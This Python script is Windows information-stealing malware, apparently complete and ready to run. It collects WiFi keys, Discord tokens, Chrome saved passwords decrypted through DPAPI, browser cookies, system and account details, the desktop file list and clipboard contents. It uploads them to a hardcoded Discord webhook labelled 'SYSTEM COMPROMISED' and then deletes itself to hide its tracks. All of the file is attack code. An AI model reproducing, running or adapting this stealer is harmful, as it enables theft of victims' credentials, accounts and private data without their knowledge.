import os
import sys
import json
import sqlite3
import base64
import shutil
import struct
import winreg
import hashlib
import hmac
import subprocess
import platform
import socket
import getpass
import time
import urllib.request
import urllib.parse
import tempfile
import ctypes
import ctypes.wintypes
from datetime import datetime, timedelta

# Your Discord webhook
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1446630967832744037/S0e26cEzguLQFxnIDd48A_qW9L3ZgBlYPiIZD_m-IyIWtCz85kUxjZiojzbXBXbfKvMq"


# DPAPI decryption for Chrome passwords
class CryptUnprotectData:
    def __init__(self):
        self.crypt = ctypes.windll.crypt32
        self.LocalFree = ctypes.windll.kernel32.LocalFree

    def decrypt(self, cipher_text):
        blob_in = ctypes.create_string_buffer(cipher_text)
        blob_in_size = len(cipher_text)
        blob_out = ctypes.POINTER(ctypes.c_byte)()
        blob_out_size = ctypes.c_ulong()

        if self.crypt.CryptUnprotectData(
                blob_in, None, None, None, None, 0,
                ctypes.byref(blob_out),
                ctypes.byref(blob_out_size)):
            data = ctypes.string_at(blob_out, blob_out_size.value)
            self.LocalFree(blob_out)
            return data.decode('utf-8')
        return None


def run_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except:
        return ""


def get_system_info():
    info = "=== SYSTEM INFORMATION ===\n"
    info += f"Computer: {socket.gethostname()}\n"
    info += f"User: {getpass.getuser()}\n"
    info += f"OS: {platform.platform()}\n"
    info += f"Architecture: {platform.architecture()[0]}\n"
    info += f"Time: {time.ctime()}\n\n"

    info += "=== IP CONFIG ===\n"
    info += run_cmd("ipconfig /all") + "\n"

    info += "=== SYSTEMINFO ===\n"
    info += run_cmd("systeminfo")[:3000] + "\n"

    info += "=== USER ACCOUNTS ===\n"
    info += run_cmd("net user") + "\n"

    return info


def get_wifi_passwords():
    wifi_data = "=== WIFI PASSWORDS ===\n"
    try:
        profiles = run_cmd("netsh wlan show profiles")
        for line in profiles.split('\n'):
            if "All User Profile" in line:
                profile = line.split(":")[1].strip()
                info = run_cmd(f'netsh wlan show profile name="{profile}" key=clear')
                for pass_line in info.split('\n'):
                    if "Key Content" in pass_line:
                        password = pass_line.split(":")[1].strip()
                        wifi_data += f"SSID: {profile} | Password: {password}\n"
                        break
    except:
        wifi_data += "Failed to get WiFi passwords\n"
    return wifi_data


def get_discord_tokens():
    tokens_data = "=== DISCORD TOKENS ===\n"
    discord_paths = [
        os.path.join(os.environ['LOCALAPPDATA'], 'Discord'),
        os.path.join(os.environ['LOCALAPPDATA'], 'DiscordCanary'),
        os.path.join(os.environ['LOCALAPPDATA'], 'DiscordPTB'),
        os.path.join(os.environ['APPDATA'], 'Discord'),
        os.path.join(os.environ['APPDATA'], 'DiscordCanary'),
        os.path.join(os.environ['APPDATA'], 'DiscordPTB')
    ]

    for discord_path in discord_paths:
        if os.path.exists(discord_path):
            leveldb_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
            if os.path.exists(leveldb_path):
                tokens_data += f"\nChecking Discord at: {discord_path}\n"

                # Look for token files
                for file in os.listdir(leveldb_path):
                    if file.endswith('.ldb') or file.endswith('.log'):
                        file_path = os.path.join(leveldb_path, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                # Look for tokens in the content
                                if 'token' in content.lower() or 'mfa.' in content:
                                    tokens_data += f"Found token file: {file}\n"
                                    # Extract potential tokens
                                    lines = content.split('\n')
                                    for line in lines:
                                        if 'token' in line.lower() and len(line) < 200:
                                            tokens_data += f"  Possible token: {line.strip()}\n"
                        except:
                            continue

    # Also check Local State file for encrypted tokens
    for discord_path in discord_paths:
        local_state_path = os.path.join(discord_path, 'Local State')
        if os.path.exists(local_state_path):
            try:
                with open(local_state_path, 'r') as f:
                    local_state = json.load(f)
                    tokens_data += f"\nLocal State found at: {discord_path}\n"
                    if 'os_crypt' in local_state and 'encrypted_key' in local_state['os_crypt']:
                        tokens_data += "Found encrypted key in Local State\n"
            except:
                pass

    if tokens_data == "=== DISCORD TOKENS ===\n":
        tokens_data += "No Discord tokens found\n"

    return tokens_data


def get_chrome_passwords():
    passwords_data = "=== CHROME PASSWORDS ===\n"

    # Chrome paths
    chrome_paths = [
        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Profile 1', 'Login Data'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Profile 2', 'Login Data'),
    ]

    for login_db in chrome_paths:
        if os.path.exists(login_db):
            try:
                # Copy the database to temp location (Chrome locks it)
                temp_db = os.path.join(tempfile.gettempdir(), 'chrome_login_data.db')
                shutil.copy2(login_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                for row in cursor.fetchall():
                    url, username, encrypted_password = row
                    if username and encrypted_password:
                        # Try to decrypt the password
                        try:
                            decrypted = CryptUnprotectData().decrypt(encrypted_password)
                            if decrypted:
                                passwords_data += f"URL: {url}\n"
                                passwords_data += f"  Email/Username: {username}\n"
                                passwords_data += f"  Password: {decrypted}\n\n"
                        except:
                            passwords_data += f"URL: {url}\n"
                            passwords_data += f"  Email/Username: {username}\n"
                            passwords_data += f"  Password: [Encrypted - decryption failed]\n\n"

                conn.close()
                os.remove(temp_db)

            except Exception as e:
                passwords_data += f"Error reading Chrome passwords: {str(e)}\n"

    if passwords_data == "=== CHROME PASSWORDS ===\n":
        passwords_data += "No Chrome passwords found or Chrome not installed\n"

    return passwords_data


def get_browser_cookies():
    cookies_data = "=== BROWSER COOKIES ===\n"

    # Check for Chrome cookies
    chrome_cookie_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
    if os.path.exists(chrome_cookie_path):
        try:
            temp_cookies = os.path.join(tempfile.gettempdir(), 'chrome_cookies.db')
            shutil.copy2(chrome_cookie_path, temp_cookies)

            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()

            cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 50")

            for host, name, value in cursor.fetchall():
                if 'discord' in host or 'google' in host or 'facebook' in host:
                    cookies_data += f"Site: {host} | Cookie: {name} = {value[:50]}\n"

            conn.close()
            os.remove(temp_cookies)
        except:
            cookies_data += "Could not read Chrome cookies\n"

    return cookies_data


def get_installed_software():
    software_data = "=== INSTALLED SOFTWARE ===\n"
    try:
        # Check registry for installed software
        reg_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]

        for reg_path in reg_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                i = 0
                while True:
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)

                        try:
                            display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            display_version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if \
                            winreg.QueryValueEx(subkey, "DisplayVersion")[1] == 1 else ""
                            software_data += f"{display_name} {display_version}\n"
                        except:
                            pass

                        winreg.CloseKey(subkey)
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except:
                pass
    except:
        software_data += "Could not read installed software\n"

    return software_data[:2000]  # Limit size


def send_to_discord(data, filename="system_report.txt"):
    try:
        # Create boundary
        boundary = "----WebKitFormBoundary" + "".join([str(i) for i in range(10)])

        # Build the body
        body = []
        body.append(f'--{boundary}')
        body.append('Content-Disposition: form-data; name="content"')
        body.append('')
        body.append('🔓 SYSTEM COMPROMISED - Complete Data Exfiltration')
        body.append(f'--{boundary}')
        body.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"')
        body.append('Content-Type: text/plain')
        body.append('')
        body.append(data)
        body.append(f'--{boundary}--')
        body.append('')

        body_bytes = '\r\n'.join(body).encode('utf-8')

        # Create request
        req = urllib.request.Request(WEBHOOK_URL, data=body_bytes)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        req.add_header('User-Agent', 'Mozilla/5.0')

        # Send
        urllib.request.urlopen(req, timeout=30)

        # Send success message
        payload = {"content": "✅ Data exfiltration completed successfully!"}
        data_bytes = json.dumps(payload).encode('utf-8')
        req2 = urllib.request.Request(WEBHOOK_URL, data=data_bytes, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req2, timeout=10)

        return True
    except Exception as e:
        # Simple fallback
        try:
            payload = {"content": f"🔓 SYSTEM DATA (Partial)\n```{data[:1500]}```"}
            data_bytes = json.dumps(payload).encode('utf-8')
            req = urllib.request.Request(WEBHOOK_URL, data=data_bytes, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=10)
        except:
            pass
        return False


def main():
    # Collect all data
    all_data = "╔══════════════════════════════════════╗\n"
    all_data += "║    COMPLETE SYSTEM EXFILTRATION     ║\n"
    all_data += "╚══════════════════════════════════════╝\n\n"

    all_data += get_system_info()
    all_data += get_wifi_passwords()
    all_data += "\n"
    all_data += get_discord_tokens()
    all_data += "\n"
    all_data += get_chrome_passwords()
    all_data += "\n"
    all_data += get_browser_cookies()
    all_data += "\n"
    all_data += get_installed_software()

    # Add desktop files list
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    if os.path.exists(desktop):
        all_data += "\n=== DESKTOP FILES ===\n"
        try:
            for item in os.listdir(desktop)[:20]:  # Limit to 20 files
                item_path = os.path.join(desktop, item)
                if os.path.isfile(item_path):
                    size = os.path.getsize(item_path) / 1024
                    all_data += f"{item} ({size:.1f} KB)\n"
        except:
            all_data += "Could not list desktop files\n"

    # Add clipboard content (if possible)
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        clipboard_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        if clipboard_data and len(clipboard_data) < 1000:
            all_data += f"\n=== CLIPBOARD CONTENT ===\n{clipboard_data}\n"
    except:
        pass

    # Send to Discord
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"system_report_{socket.gethostname()}_{timestamp}.txt"

    success = send_to_discord(all_data, filename)

    # Clean up - delete this script
    try:
        os.remove(sys.argv[0])
    except:
        pass

    return success


if __name__ == "__main__":
    main()
